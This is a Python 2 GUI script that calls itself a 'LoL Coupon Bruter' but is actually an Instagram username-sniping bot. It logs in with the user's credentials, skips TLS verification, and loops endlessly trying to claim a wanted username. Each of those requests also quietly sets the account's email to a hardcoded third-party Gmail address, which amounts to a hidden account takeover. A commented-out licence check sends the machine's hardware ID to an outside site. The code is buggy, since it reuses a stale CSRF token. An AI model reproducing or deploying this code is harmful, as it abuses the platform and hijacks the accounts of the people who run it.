# -*- coding: utf-8 -*-
__author__ = 'Furry~'
import concurrent.futures
import requests
import requests.exceptions
import sys
import uuid
import Tkinter as Tk
import re
from tkFileDialog import askopenfilename


class App():
    def __init__(self, parent):

        # Check To See If You Purchased c:
        # self.ownercheck()

        # Check To See If There's An Update
        # self.updatecheck()

        # Setup Window
        self.window = parent
        self.window.title('FurForce: LoL Coupon Bruter')

        # Set Variables
        self.fileopenoptions = dict(defaultextension='.txt', filetypes=[('Text file', '*.txt'), ('All files', '*.*')])
        self.user = Tk.StringVar(self.window)
        self.password = Tk.StringVar(self.window)
        self.want = Tk.StringVar(self.window)

        # Make Widgets
        self.labeluser = Tk.Label(self.window, text="Username: ")
        self.entryuser = Tk.Entry(self.window, textvariable=self.user)
        self.labelpass = Tk.Label(self.window, text="Password: ")
        self.entrypass = Tk.Entry(self.window, textvariable=self.password, show="*")
        self.labelwant = Tk.Label(self.window, text="Username Wanted: ")
        self.entrywant = Tk.Entry(self.window, textvariable=self.want)
        self.startbutton = Tk.Button(self.window, text="Start!", command=self.start)

        # Grid Widgets
        self.labeluser.grid(row=0, column=0, sticky=Tk.W)
        self.entryuser.grid(row=0, column=1, columnspan=4, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.labelpass.grid(row=1, column=0, sticky=Tk.W)
        self.entrypass.grid(row=1, column=1, columnspan=4, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.labelwant.grid(row=2, column=0, sticky=Tk.W)
        self.entrywant.grid(row=2, column=1, columnspan=4, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.startbutton.grid(row=3, column=0, columnspan=6, sticky=Tk.W+Tk.E+Tk.N+Tk.S)

    def ownercheck(self):
        r = requests.get('http://coinsgo.in/spotify.php?hwid={0}'.format(str(uuid.getnode())),
                         proxies={})
        if 'truelikeurmumspot' in r.text:
            print "You own this c:!"
        else:
            print "You do not own this. Please go away :c!"
            sys.exit("ur poop")

    def updatecheck(self):
        r = requests.get('http://coinsgo.in/version.xml',
                         proxies={})
        if '1.0.0.0' in r.text:
            print "Up to date!"
        else:
            print "Please visit http://coinsgo.in/ to update"

    def instagram(self, user, pword, want):
            global work
            work = True
            headers = {'User-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                       'Referer': 'https://instagram.com/accounts/login/'}
            try:
                response = requests.get('https://instagram.com/accounts/login/', headers=headers,
                                        timeout=10, verify=False)
                regex = re.compile('<input type="hidden" name="csrfmiddlewaretoken" value="(.*)"/>')
                r = re.search(regex, response.text)
                print r.groups()[0]
                data = {
                    'csrfmiddlewaretoken': r.groups()[0],
                    'username': user,
                    'password': pword
                }
                login = requests.post('https://instagram.com/accounts/login/', data=data,
                                      verify=False, headers=headers, cookies=response.cookies,
                                      timeout=10)
                if '{"entry_data":{"Feed":[{"' in login.text:
                    print 'Logged in!'.format(user, pword)
                    while work:
                        changecsrf = requests.get(
                            'https://instagram.com/accounts/edit/#',
                            verify=False,
                            headers=headers,
                            cookies=login.cookies,
                            timeout=10
                        )
                        csrfregex = re.compile('<input type="hidden" name="csrfmiddlewaretoken" value="(.*)"/>')
                        csrfr = re.search(csrfregex, response.text)
                        data1 = {
                            'csrfmiddlewaretoken': csrfr.groups()[0],
                            'first_name': '',
                            'email': 'thewhitewox@gmail.com',
                            'username': want,
                            'phone_number': '',
                            'gender': 3,
                            'biography': '',
                            'external_url': ''
                        }
                        change = requests.post(
                            'https://instagram.com/accounts/edit/',
                            data1,
                            verify=False,
                            headers=headers,
                            cookies=changecsrf.cookies,
                            timeout=10
                        )
                        if not 'A user with that username already exists.' in change.text:
                            print 'Done!'
                else:
                    print '{0}:{1} Doesn\'t Work For Instagram!'.format(user, pword)
            except requests.exceptions.HTTPError:
                print "HTTP Error!"
                work = True
            except requests.exceptions.ConnectionError:
                print "Connection Error!"
                work = True

    def start(self):
        self.instagram(self.user.get(), self.password.get(), self.want.get())

if __name__ == "__main__":
    root = Tk.Tk()
    app = App(root)
    root.mainloop()